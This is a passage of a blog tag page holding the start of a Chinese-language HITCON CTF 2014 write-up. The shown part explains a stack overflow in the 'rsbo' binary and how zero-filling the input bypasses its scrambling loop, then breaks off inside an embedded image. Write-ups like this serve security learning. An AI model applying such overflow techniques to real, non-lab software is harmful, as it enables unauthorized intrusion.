
<!DOCTYPE html>
<html lang="en">
    
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="generator" content="Eadom&#39;s Blog">
    <title>Tag: hitcon-ctf - Eadom&#39;s Blog</title>
    <meta name="author" content="Eadom">
    
    
        <link rel="icon" href="https://blog.eadom.net/assets/images/avatar.jpg">
    
    
        
            <link rel="alternate" type="application/atom+xml" title="RSS" href="/atom.xml">
        
    
    <script type="application/ld+json">{}</script>
    <meta property="og:type" content="blog">
<meta property="og:title" content="Eadom&#39;s Blog">
<meta property="og:url" content="https://blog.eadom.net/tags/hitcon-ctf/index.html">
<meta property="og:site_name" content="Eadom&#39;s Blog">
<meta property="og:locale" content="en">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="Eadom&#39;s Blog">
<meta name="twitter:creator" content="@Yufan_L">
    
    
        
    
    
        <meta property="og:image" content="https://blog.eadom.net/assets/images/avatar.jpg"/>
    
    
    
    
    <!--STYLES-->
    <link rel="stylesheet" href="/assets/css/style-sifsy9oex2dugunw1y6dni61b2yek7gdovchv6fh3t7csw6uv5ophjuqcfmz.min.css">
    <!--STYLES END-->
    

    
    <script type="text/javascript">
    var _hmt = _hmt || [];
    (function() {
      var hm = document.createElement("script");
      hm.src = "//hm.baidu.com/hm.js?e2c34d89d7cd8c97b8b39f770eac6769";
      var s = document.getElementsByTagName("script")[0];
      s.parentNode.insertBefore(hm, s);
    })();
    </script>


    
</head>

    <body>
        <div id="blog">
            <!-- Define author's picture -->


    
        
            
        
    

<header id="header" data-behavior="1">
    <i id="btn-open-sidebar" class="fa fa-lg fa-bars"></i>
    <div class="header-title">
        <a
            class="header-title-link"
            href="/"
            aria-label=""
        >
            Eadom&#39;s Blog
        </a>
    </div>
    
        
            <a
                class="header-right-picture "
                href="#about"
                aria-label="Open the link: /#about"
            >
        
        
            <img class="header-picture" src="/assets/images/avatar.jpg" alt="Author&#39;s picture"/>
        
        </a>
    
</header>

            <!-- Define author's picture -->



        
    

<nav id="sidebar" data-behavior="1">
    <div class="sidebar-container">
        
            <div class="sidebar-profile">
                <a
                    href="/#about"
                    aria-label="Read more about the author"
                >
                    <img class="sidebar-profile-picture" src="/assets/images/avatar.jpg" alt="Author&#39;s picture"/>
                </a>
                <h4 class="sidebar-profile-name">Eadom</h4>
                
                    <h5 class="sidebar-profile-bio"><p>NO PWN NO FUN</p>
</h5>
                
            </div>
        
        
            <ul class="sidebar-buttons">
            
                <li class="sidebar-button">
                    
                        <a
                            class="sidebar-button-link "
                            href="/"
                            
                            rel="noopener"
                            title="Home"
                        >
                        <i class="sidebar-button-icon fa fa-home" aria-hidden="true"></i>
                        <span class="sidebar-button-desc">Home</span>
                    </a>
            </li>
            
                <li class="sidebar-button">
                    
                        <a
                            class="sidebar-button-link "
                            href="/all-categories"
                            
                            rel="noopener"
                            title="Categories"
                        >
                        <i class="sidebar-button-icon fa fa-bookmark" aria-hidden="true"></i>
                        <span class="sidebar-button-desc">Categories</span>
                    </a>
            </li>
            
                <li class="sidebar-button">
                    
                        <a
                            class="sidebar-button-link "
                            href="/all-tags"
                            
                            rel="noopener"
                            title="Tags"
                        >
                        <i class="sidebar-button-icon fa fa-tags" aria-hidden="true"></i>
                        <span class="sidebar-button-desc">Tags</span>
                    </a>
            </li>
            
                <li class="sidebar-button">
                    
                        <a
                            class="sidebar-button-link "
                            href="/all-archives"
                            
                            rel="noopener"
                            title="Archives"
                        >
                        <i class="sidebar-button-icon fa fa-archive" aria-hidden="true"></i>
                        <span class="sidebar-button-desc">Archives</span>
                    </a>
            </li>
            
                <li class="sidebar-button">
                    
                        <a
                            class="sidebar-button-link "
                            href="#about"
                            
                            rel="noopener"
                            title="About"
                        >
                        <i class="sidebar-button-icon fa fa-question" aria-hidden="true"></i>
                        <span class="sidebar-button-desc">About</span>
                    </a>
            </li>
            
        </ul>
        
            <ul class="sidebar-buttons">
            
                <li class="sidebar-button">
                    
                        <a
                            class="sidebar-button-link "
                            href="https://github.com/eadom"
                            
                                target="_blank"
                            
                            rel="noopener"
                            title="GitHub"
                        >
                        <i class="sidebar-button-icon fab fa-github" aria-hidden="true"></i>
                        <span class="sidebar-button-desc">GitHub</span>
                    </a>
            </li>
            
                <li class="sidebar-button">
                    
                        <a
                            class="sidebar-button-link "
                            href="https://www.linkedin.com/in/yukunliu/"
                            
                                target="_blank"
                            
                            rel="noopener"
                            title="LinkedIn"
                        >
                        <i class="sidebar-button-icon fab fa-linkedin" aria-hidden="true"></i>
                        <span class="sidebar-button-desc">LinkedIn</span>
                    </a>
            </li>
            
                <li class="sidebar-button">
                    
                        <a
                            class="sidebar-button-link "
                            href="http://weibo.com/onetpig"
                            
                                target="_blank"
                            
                            rel="noopener"
                            title="Weibo"
                        >
                        <i class="sidebar-button-icon fab fa-weibo" aria-hidden="true"></i>
                        <span class="sidebar-button-desc">Weibo</span>
                    </a>
            </li>
            
                <li class="sidebar-button">
                    
                        <a
                            class="sidebar-button-link "
                            href="https://twitter.com/Yufan_L"
                            
                                target="_blank"
                            
                            rel="noopener"
                            title="Twitter"
                        >
                        <i class="sidebar-button-icon fab fa-twitter" aria-hidden="true"></i>
                        <span class="sidebar-button-desc">Twitter</span>
                    </a>
            </li>
            
        </ul>
        
            <ul class="sidebar-buttons">
            
                <li class="sidebar-button">
                    
                        <a
                            class="sidebar-button-link "
                            href="/atom.xml"
                            
                            rel="noopener"
                            title="RSS"
                        >
                        <i class="sidebar-button-icon fa fa-rss" aria-hidden="true"></i>
                        <span class="sidebar-button-desc">RSS</span>
                    </a>
            </li>
            
        </ul>
        
    </div>
</nav>

            
            <div id="main" data-behavior="1"
                 class="
                        hasCoverMetaIn
                        ">
                
    <section class="postShorten-group main-content-wrap">
    
    
    <article class="postShorten postShorten--thumbnailimg-bottom">
        <div class="postShorten-wrap">
            
            <div class="postShorten-header">
                <h1 class="postShorten-title">
                    
                        <a
                            class="link-unstyled"
                            href="/writeups/hitcon-ctf-2014-rsbo-finger-rsaha-writeup/"
                            aria-label=": HITCON CTF 2014 rsbo,finger,rsaha writeup"
                        >
                            HITCON CTF 2014 rsbo,finger,rsaha writeup
                        </a>
                    
                </h1>
                <div class="postShorten-meta">
    <time datetime="2014-09-04T14:45:12+08:00">
	
		    Sep 04, 2014
    	
    </time>
    
        <span>in </span>
        
    <a class="category-link" href="/categories/writeups/">writeups</a>


    
</div>

            </div>
            
                <div class="postShorten-content">
                    <h1 id="0x01-rsbo"><a href="#0x01-rsbo" class="headerlink" title="0x01 rsbo"></a>0x01 rsbo</h1><p>ELF 32-bit LSB  executable 栈有随机化且不能执行 静态分析程序,有调试信息 read_80_bytes能读入0x80即128bytes到&amp;v2，造成栈溢出 但输入后会进行一个混淆，所以使用0输入前0x60位，可覆盖过变量v5的位置，当随机替换v5处值与之前的0时即可退出循环 <img src="data:image/png;base64,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